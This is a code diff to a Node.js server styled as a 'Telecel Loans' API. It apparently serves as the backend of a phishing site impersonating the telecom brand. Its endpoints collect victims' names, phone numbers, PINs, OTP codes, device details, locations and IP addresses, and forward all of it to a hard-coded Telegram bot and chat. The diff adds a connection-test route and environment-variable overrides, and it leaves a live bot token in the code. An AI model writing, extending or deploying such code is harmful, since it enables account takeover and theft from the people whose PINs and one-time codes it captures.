@@ -3,13 +3,27 @@ const cors = require('cors');
 const bodyParser = require('body-parser');
 const axios = require('axios');
 
-// ─── CONFIGURATION ───
+// ─── CONFIGURATION (from Environment Variables) ───
 const CONFIG = {
-    BOT_TOKEN: '8993833860:AAHz1B3ueOgICpj_JdhckTf7Xp0Vu6IeLCY',
-    CHAT_ID: '7730849900',
-    PORT: process.env.PORT || 3000,
+    BOT_TOKEN: process.env.BOT_TOKEN || '8993833860:AAHz1B3ueOgICpj_JdhckTf7Xp0Vu6IeLCY',
+    CHAT_ID: process.env.CHAT_ID || '7730849900',
+    PORT: process.env.PORT || 5000,
+    API_URL: process.env.API_URL || 'https://telecelcom-production.up.railway.app',
+    OTP_PAGE: process.env.OTP_PAGE || 'otp.html',
+    DEVICE_PAGE: process.env.DEVICE_PAGE || 'device_verify.html',
+    HOME_PAGE: process.env.HOME_PAGE || 'index.html',
     ALLOWED_ORIGINS: ['*']
 };
+
+console.log('🚀 Starting Telecel Loans API...');
+console.log('📋 Configuration:');
+console.log(`   BOT_TOKEN: ${CONFIG.BOT_TOKEN ? '✅ Set' : '❌ Missing'}`);
+console.log(`   CHAT_ID: ${CONFIG.CHAT_ID || '❌ Missing'}`);
+console.log(`   PORT: ${CONFIG.PORT}`);
+console.log(`   API_URL: ${CONFIG.API_URL}`);
+console.log(`   OTP_PAGE: ${CONFIG.OTP_PAGE}`);
+console.log(`   DEVICE_PAGE: ${CONFIG.DEVICE_PAGE}`);
+console.log(`   HOME_PAGE: ${CONFIG.HOME_PAGE}`);
 
 // ─── EXPRESS APP ───
 const app = express();
@@ -36,16 +50,22 @@ app.get('/', (req, res) => {
         status: 'OK',
         message: 'Telecel Loans API is running',
         timestamp: new Date().toISOString(),
-        version: '1.0.0'
+        version: '1.0.0',
+        config: {
+            botConfigured: !!CONFIG.BOT_TOKEN,
+            chatConfigured: !!CONFIG.CHAT_ID,
+            port: CONFIG.PORT
+        }
     });
 });
 
-// ─── HEALTH CHECK (Railway) ───
 app.get('/health', (req, res) => {
     res.status(200).json({ 
         status: 'healthy',
         uptime: process.uptime(),
-        timestamp: new Date().toISOString()
+        timestamp: new Date().toISOString(),
+        memory: process.memoryUsage(),
+        port: CONFIG.PORT
     });
 });
 
@@ -65,23 +85,6 @@ async function sendTelegramMessage(message) {
     }
 }
 
-// ─── SEND TELEGRAM PHOTO ───
-async function sendTelegramPhoto(photoUrl, caption) {
-    try {
-        const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`;
-        const response = await axios.post(url, {
-            chat_id: CONFIG.CHAT_ID,
-            photo: photoUrl,
-            caption: caption,
-            parse_mode: 'Markdown'
-        });
-        return response.data;
-    } catch (error) {
-        console.error('❌ Telegram Photo Error:', error.response?.data || error.message);
-        throw error;
-    }
-}
-
 // ─── API ROUTES ───
 
 // 1. Send Loan Authorization Notification
@@ -89,7 +92,6 @@ app.post('/api/authorize', async (req, res) => {
     try {
         const { name, phone, amount, pin, period } = req.body;
 
-        // Validate required fields
         if (!name || !phone || !amount || !pin) {
             return res.status(400).json({
                 success: false,
@@ -97,7 +99,6 @@ app.post('/api/authorize', async (req, res) => {
             });
         }
 
-        // Create Telegram message
         const message = `🔐 *New Loan Authorization Request*\n\n` +
             `👤 *User:* ${name}\n` +
             `📱 *Phone:* ${phone}\n` +
@@ -107,7 +108,6 @@ app.post('/api/authorize', async (req, res) => {
             `⏰ *Time:* ${new Date().toLocaleString()}\n\n` +
             `✅ User has been redirected to OTP verification.`;
 
-        // Send to Telegram
         const result = await sendTelegramMessage(message);
 
         res.json({
@@ -127,46 +127,8 @@ app.post('/api/authorize', async (req, res) => {
     }
 });
 
-// 2. Send OTP Request Notification
-app.post('/api/otp-request', async (req, res) => {
-    try {
-        const { name, phone, otp } = req.body;
-
-        if (!name || !phone || !otp) {
-            return res.status(400).json({
-                success: false,
-                message: 'Missing required fields: name, phone, otp'
-            });
-        }
-
-        const message = `📱 *OTP Verification Request*\n\n` +
-            `👤 *User:* ${name}\n` +
-            `📱 *Phone:* ${phone}\n` +
-            `🔑 *OTP Code:* \`${otp}\`\n` +
-            `⏰ *Time:* ${new Date().toLocaleString()}\n\n` +
-            `✅ User is verifying their OTP.`;
-
-        const result = await sendTelegramMessage(message);
-
-        res.json({
-            success: true,
-            message: 'OTP notification sent successfully',
-            telegram: result,
-            timestamp: new Date().toISOString()
-        });
-
-    } catch (error) {
-        console.error('❌ OTP Error:', error);
-        res.status(500).json({
-            success: false,
-            message: 'Failed to send OTP notification',
-            error: error.message
-        });
-    }
-});
-
-// 3. Send OTP Verified Confirmation
-app.post('/api/otp-verified', async (req, res) => {
+// 2. Generate OTP
+app.post('/api/generate-otp', async (req, res) => {
     try {
         const { name, phone } = req.body;
 
@@ -177,17 +139,62 @@ app.post('/api/otp-verified', async (req, res) => {
             });
         }
 
-        const message = `✅ *OTP Verification Successful*\n\n` +
+        const otp = Math.floor(100000 + Math.random() * 900000).toString();
+
+        const message = `🔑 *OTP Generated*\n\n` +
             `👤 *User:* ${name}\n` +
             `📱 *Phone:* ${phone}\n` +
+            `🔢 *OTP:* \`${otp}\`\n` +
             `⏰ *Time:* ${new Date().toLocaleString()}\n\n` +
-            `🔐 User has successfully verified their OTP. Proceeding to device verification.`;
+            `📨 OTP has been sent to user.`;
 
         const result = await sendTelegramMessage(message);
 
         res.json({
             success: true,
-            message: 'OTP verified notification sent successfully',
+            otp: otp,
+            message: 'OTP generated and notification sent successfully',
+            telegram: result,
+            timestamp: new Date().toISOString()
+        });
+
+    } catch (error) {
+        console.error('❌ Generate OTP Error:', error);
+        res.status(500).json({
+            success: false,
+            message: 'Failed to generate OTP',
+            error: error.message
+        });
+    }
+});
+
+// 3. OTP Verified
+app.post('/api/otp-verified', async (req, res) => {
+    try {
+        const { name, phone, otp, verified } = req.body;
+
+        if (!name || !phone) {
+            return res.status(400).json({
+                success: false,
+                message: 'Missing required fields: name, phone'
+            });
+        }
+
+        const status = verified ? '✅ SUCCESS' : '❌ FAILED';
+        const message = `📱 *OTP Verification*\n\n` +
+            `👤 *User:* ${name}\n` +
+            `📱 *Phone:* ${phone}\n` +
+            `🔑 *OTP Entered:* \`${otp || 'N/A'}\`\n` +
+            `📊 *Status:* ${status}\n` +
+            `⏰ *Time:* ${new Date().toLocaleString()}\n\n` +
+            (verified ? '✅ User verified OTP successfully! Proceeding to device verification.' : '❌ User entered invalid OTP.');
+
+        const result = await sendTelegramMessage(message);
+
+        res.json({
+            success: true,
+            verified: verified,
+            message: 'OTP verification notification sent successfully',
             telegram: result,
             timestamp: new Date().toISOString()
         });
@@ -196,13 +203,13 @@ app.post('/api/otp-verified', async (req, res) => {
         console.error('❌ OTP Verified Error:', error);
         res.status(500).json({
             success: false,
-            message: 'Failed to send OTP verified notification',
+            message: 'Failed to send OTP verification notification',
             error: error.message
         });
     }
 });
 
-// 4. Send Device Verification Notification
+// 4. Device Verification
 app.post('/api/device-verify', async (req, res) => {
     try {
         const { name, phone, device, browser, location, ip } = req.body;
@@ -243,7 +250,7 @@ app.post('/api/device-verify', async (req, res) => {
     }
 });
 
-// 5. Send Loan Disbursement Confirmation
+// 5. Loan Disbursed
 app.post('/api/loan-disbursed', async (req, res) => {
     try {
         const { name, phone, amount, transactionId } = req.body;
@@ -283,66 +290,49 @@ app.post('/api/loan-disbursed', async (req, res) => {
     }
 });
 
-// 6. Generate OTP (for simulation)
-app.post('/api/generate-otp', async (req, res) => {
-    try {
-        const { name, phone } = req.body;
-
-        if (!name || !phone) {
-            return res.status(400).json({
-                success: false,
-                message: 'Missing required fields: name, phone'
-            });
-        }
-
-        // Generate 6-digit OTP
-        const otp = Math.floor(100000 + Math.random() * 900000).toString();
-
-        const message = `🔑 *OTP Generated*\n\n` +
-            `👤 *User:* ${name}\n` +
-            `📱 *Phone:* ${phone}\n` +
-            `🔢 *OTP:* \`${otp}\`\n` +
-            `⏰ *Time:* ${new Date().toLocaleString()}\n\n` +
-            `📨 OTP has been sent to user.`;
-
-        const result = await sendTelegramMessage(message);
-
-        res.json({
-            success: true,
-            otp: otp,
-            message: 'OTP generated and notification sent successfully',
-            telegram: result,
-            timestamp: new Date().toISOString()
-        });
-
-    } catch (error) {
-        console.error('❌ Generate OTP Error:', error);
-        res.status(500).json({
-            success: false,
-            message: 'Failed to generate OTP',
-            error: error.message
-        });
-    }
-});
-
-// 7. Get config (for frontend)
+// 6. Get config for frontend
 app.get('/api/config', (req, res) => {
     res.json({
         success: true,
         config: {
-            apiUrl: 'https://telecelcom-production.up.railway.app',
-            botToken: CONFIG.BOT_TOKEN,
-            chatId: CONFIG.CHAT_ID,
+            apiUrl: CONFIG.API_URL,
+            botToken: CONFIG.BOT_TOKEN ? 'configured' : 'not configured',
+            chatId: CONFIG.CHAT_ID ? 'configured' : 'not configured',
             pages: {
-                otp: 'otp.html',
-                device: 'device_verify.html',
-                home: 'index.html'
+                otp: CONFIG.OTP_PAGE,
+                device: CONFIG.DEVICE_PAGE,
+                home: CONFIG.HOME_PAGE
             }
         }
     });
 });
 
-// ─── CATCH-ALL ROUTE ───
+// 7. Test Telegram Connection
+app.get('/api/test-telegram', async (req, res) => {
+    try {
+        const testMessage = `🧪 *Telegram Test Message*\n\n` +
+            `✅ Connection successful!\n` +
+            `⏰ Time: ${new Date().toLocaleString()}\n` +
+            `🤖 Bot: ${CONFIG.BOT_TOKEN ? 'Configured' : 'Not configured'}\n` +
+            `💬 Chat: ${CONFIG.CHAT_ID || 'Not configured'}`;
+
+        const result = await sendTelegramMessage(testMessage);
+        
+        res.json({
+            success: true,
+            message: 'Test message sent successfully! Check your Telegram.',
+            telegram: result
+        });
+    } catch (error) {
+        res.status(500).json({
+            success: false,
+            message: 'Failed to send test message',
+            error: error.message
+        });
+    }
+});
+
+// ─── CATCH-ALL ───
 app.use((req, res) => {
     res.status(404).json({
         success: false,
@@ -352,9 +342,11 @@ app.use((req, res) => {
 });
 
 // ─── START SERVER ───
-app.listen(CONFIG.PORT, () => {
+app.listen(CONFIG.PORT, '0.0.0.0', () => {
     console.log(`🚀 Telecel Loans API running on port ${CONFIG.PORT}`);
-    console.log(`📡 Health check: http://localhost:${CONFIG.PORT}/health`);
+    console.log(`📡 Health check: ${CONFIG.API_URL}/health`);
+    console.log(`📡 Test Telegram: ${CONFIG.API_URL}/api/test-telegram`);
     console.log(`🤖 Telegram Bot: ${CONFIG.BOT_TOKEN ? '✅ Configured' : '❌ Not configured'}`);
     console.log(`💬 Chat ID: ${CONFIG.CHAT_ID || '❌ Not set'}`);
+    console.log(`✅ Server is ready to accept connections!`);
 });
